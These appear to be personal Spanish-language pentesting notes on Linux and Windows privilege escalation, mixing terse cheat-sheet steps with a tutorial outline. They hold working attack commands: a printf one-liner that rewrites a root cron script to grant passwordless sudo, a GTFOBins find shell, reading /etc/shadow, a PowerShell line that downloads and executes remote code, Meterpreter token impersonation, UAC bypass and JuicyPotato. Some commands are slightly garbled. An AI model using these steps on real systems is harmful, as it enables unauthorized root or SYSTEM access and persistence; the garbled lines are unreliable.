# Privilege Escalation

Propietario: Adrian Gisbert Cabello

# Linux

Links de referencia:

- Linux Exploit Suggester GitHub: [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)

**ATENCIÓN!!!! SI EXPLOTAMOS VULNERABILIDADES DEL KERNEL, ESTAR MUY SEGUROS DEL KERNEL QUE TENEMOS QUE EXPLOTAR. SI USAMOS EXPLOITS PARA UN KERNEL DISTINTO PODEMOS CORROMPER EL SISTEMA E INCLUSO PERDER TODOS LOS DATOS, SOBRETODO TENER EN CUENTA PARA AUDITORIAS EN ENTORNOS EMPRESARIALES, ETC. !!!!!**

- Para saber la información del sistema: `sysinfo`
- En una consola meterpreter y gracias a la información del link de GitHub, podemos entrar en el directorio `cd /tmp`, y subir un script para escalar privilegios con `les`.
    - Descargamos el script en nuestra máquina atacante: `wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh`
    - Subimos el archivo al directorio /tmp: `/home/kali/Downloads/les.sh`
    - Le damos permisos de ejecución: `chmod +x les.sh`
    - Ejecutamos el script: `./les.sh`
    - Ahora nos mostrará información del sistema y una lista de todas las vulnerabilidades que podemos explotar.

- Para ver tareas programadas:	`crontab -l`
- ***sudo -l*** → Copiamos y buscamos el path que veamos que tenga permisos de root p.ej:		`(root) NOPASSWD: /usr/bin/find` → Un buen buscador es la página GTFObins (En este caso usariamos el siguiente comando: `sudo find /etc/passwd exec /bin/sh \;`
- ***sudo su*** → Si no nos pide contraseña ya seremos root
- Para listar usuarios: `cat /etc/passwd` (ver todos los usuarios que tengan ***/bin/bash*** → `vagrant:x:1001:1001:vagrant,vagrant,,:/home/vagrant:/bin/bash` (para buscarlo fácilmente usar un grep)
- También podemos listar entrando en el directorio `cd /home` y hacer un `ls`
- Para enumerar carpetas en las que tenemos privilegios: `find / -perm -4000 2>/dev/null`		|		`find / -perm -007 2>/dev/null`
- `getcap -r / 2>/dev/null`
- Para investigar un archivo que creemos que está ejecutando root con una tarea (cronjob) nos situamos en el directorio raíz `cd /`, y escribimos: `grep -rnw /usr -e ¨/directorio/del/archivo¨` y veremos qué lo está haciendo ejecutar.
- Para editar el script que lo ejecuta (copy.sh) no tenemos ni vim ni nano instalados, podemos probar a usar:
    - `printf ‘#!/bin/bash\necho ¨student ALL=NOPASSWD:ALL¨ **>>** /etc/sudoers’ **>** /usr/local/share/copy.sh`
    - Va a hacer un echo de ¨student ALL=NOPASSWD:ALL¨ **>>** /etc/sudoers’ (student es el nombre de usuario) y lo guardamos en el script copy.sh

# Windows

Links de referencia:

- Windows Exploit Suggester GitHub: [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- Windows Kernel Exploits GitHub: [https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-135](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-135)

En metasploit, una vez tenemos una session meterpreter, la ponemos en background y buscamos `search suggester` (`use 0`) y en show options especificamos la session. Nos buscará todas las vulnerabilidades para escalar privilegios, solo tendremos que usar el modulo de exploit que nos diga que puede funcionar y usarlo

UAC (User Account Control):

- Bypassing with UACMe, link of repository tool GitHub: [https://github.com/hfiref0x/UACME](https://github.com/hfiref0x/UACME)
- Para hacerlo mediante metasploit: `search rejetto` (`use exploit/windows/http/rejetto_hfs_exec`) x86 Windows by default
- En la sesion meterpreter miramos los procesos `pgrep explorer` y migramos el proceso `migrate 3512` (ponemos el número del proceso que tengamos)

Acces Token Impersonation (Tokens creados cada vez que se inicia sesión):

- Para hacerlo mediante metasploit: `search rejetto` (`use exploit/windows/http/rejetto_hfs_exec`) x86 Windows by default
- En la sesion meterpreter miramos los procesos `pgrep explorer` y migramos el proceso `migrate 3512` (ponemos el número del proceso que tengamos)
- Si obtenemos un error al migrar el proceso es porque no tenemos privilegios, comprobamos con `getuid` y `getprivs`
- Si en los privilegios observamos `SeImpersonatePrivilege`, escribimos el comando en la consola meterpreter: `load incognito` (si no nos deja  ejecutamos el exploit otra vez) y volvemos a escribir `load incognito`. Seguidamente listamos los tokens `list_tokens -u`, copiamos el nombre del token y escribimos lo siguiente: `impersonate_token ¨NOMBRE DEL TOKEN¨` y una vez hecho esto comprobamos con `getuid`, si hemos podido escalar los privilegios `getprivs` bien, si nos da un error hay que volver a migrar un proceso: `pgrep explorer` - `migrate 3512` (ponemos el número del proceso que tengamos). Ahora si miramos los privilegios `getprivs` ya habremos escalado privilegios exitosamente.
- Si aún no somos AUTORITY/SYSTEM tenemos que volver a elevar los privilegios y repetir el proceso anterior pero copiando el token de AUTORITY/SYSTEM (Seguramente ya no tengamnos que migrar procesos, pero sino lo volvemos a hacer):

### 1. Introducción a la Escalación de Privilegios

La escalación de privilegios es el proceso de obtener niveles de acceso más altos en un sistema comprometido, comenzando desde un usuario no privilegiado hasta un usuario con mayores privilegios, como un administrador o root. Este proceso es crucial porque compromisos directos con privilegios máximos son raros en entornos modernos .

### 2. Recolección de Información Inicial

Después de comprometer un objetivo y obtener acceso como usuario no privilegiado, el primer paso es recolectar tanta información como sea posible sobre el sistema objetivo para identificar posibles vectores de escalación de privilegios.

### 2.1. Enumeración Manual

La enumeración manual puede ser lenta, pero permite un control más detallado y puede identificar métodos de escalación más exóticos que a menudo son pasados por alto por herramientas automatizadas.

- **Enumerar Usuarios**:
    
    ```bash
    whoami
    id
    ```
    
- **Información del Sistema**:
    
    ```bash
    uname -a
    cat /etc/issue
    lsb_release -a
    ```
    
- **Listar Procesos y Servicios**:
    
    ```bash
    ps aux
    service --status-all
    ```
    
- **Buscar Configuraciones y Archivos Interesantes**:
    
    ```bash
    find / -perm -4000 -type f 2>/dev/null
    find / -name "*.conf" 2>/dev/null
    cat /etc/passwd
    cat /etc/shadow (si es posible)
    ```
    

### 2.2. Enumeración Automatizada

Las herramientas automatizadas pueden ahorrar tiempo y proporcionar una visión general rápida de posibles vulnerabilidades de escalación de privilegios.

- **Linux Smart Enumeration (LSE)**:
    
    ```bash
    wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh
    chmod +x lse.sh
    ./lse.sh
    ```
    
- **LinPEAS**:
    
    ```bash
    wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
    chmod +x linpeas.sh
    ./linpeas.sh
    ```
    
- **Windows Privilege Escalation**:
    
    ```bash
    powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/GhostPack/Seatbelt/master/Seatbelt/Seatbelt.ps1'); Invoke-Seatbelt -group=all"
    ```
    

### 3. Técnicas Comunes de Escalación de Privilegios

### 3.1. Linux

- **SUID/GUID Files**:
Archivos con permisos SUID/SGID permiten la ejecución con privilegios del propietario.
    
    ```bash
    find / -perm -4000 -type f 2>/dev/null
    ```
    
- **Configuraciones de Cron**:
Los trabajos de cron con permisos incorrectos pueden ser explotados.
    
    ```bash
    cat /etc/crontab
    ls -la /etc/cron.*
    ```
    
- **Permisos Incorrectos en Archivos Importantes**:
Archivos de configuración sensibles con permisos incorrectos pueden ser explotados.
    
    ```bash
    find /etc -name "*.conf" -perm /o=w 2>/dev/null
    ```
    
- **Kernel Exploits**:
Buscar exploits para la versión específica del kernel.
    
    ```bash
    uname -r
    searchsploit linux kernel 4.x.x
    ```
    

### 3.2. Windows

- **Juicy Potato**:
Utiliza el privilegio SeImpersonatePrivilege para escalar privilegios.
    
    ```bash
    https://github.com/ohpe/juicy-potato
    ```
    
- **Insecure Service Permissions**:
Servicios con permisos inseguros pueden ser explotados.
    
    ```bash
    sc qc [service_name]
    icacls [service_path]
    ```
    
- **Unquoted Service Paths**:
Explota rutas de servicios sin comillas.
    
    ```bash
    wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
    ```
    
- **DLL Hijacking**:
Coloca una DLL maliciosa en un directorio donde una aplicación busca librerías.
    
    ```bash
    https://github.com/blacknbunny/DLL-Hijacking
    ```
    

### 4. Ejemplos Prácticos

### 4.1. Ejemplo en Linux: SUID Binary Exploitation

Buscar y explotar binarios SUID:

```bash
find / -perm -4000 -type f 2>/dev/null
# Supongamos que encontramos /usr/bin/sudoedit con SUID
sudoedit -s /
```

### 4.2. Ejemplo en Windows: Juicy Potato

Compilar y ejecutar Juicy Potato:

```bash
# Descargar y compilar Juicy Potato
git clone https://github.com/ohpe/juicy-potato
# Transferir el binario al objetivo y ejecutarlo
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -t * -c {CLSID}
```

### 5. Herramientas Adicionales

- **PowerUp**: Herramienta para la escalación de privilegios en Windows.
    
    ```powershell
    Import-Module .\PowerUp.ps1
    Invoke-AllChecks
    ```
    
- **BeRoot**: Herramienta para verificar técnicas comunes de escalación de privilegios en Linux y Windows.
    
    ```bash
    git clone https://github.com/AlessandroZ/BeRoot
    cd BeRoot
    ./beroot
    ```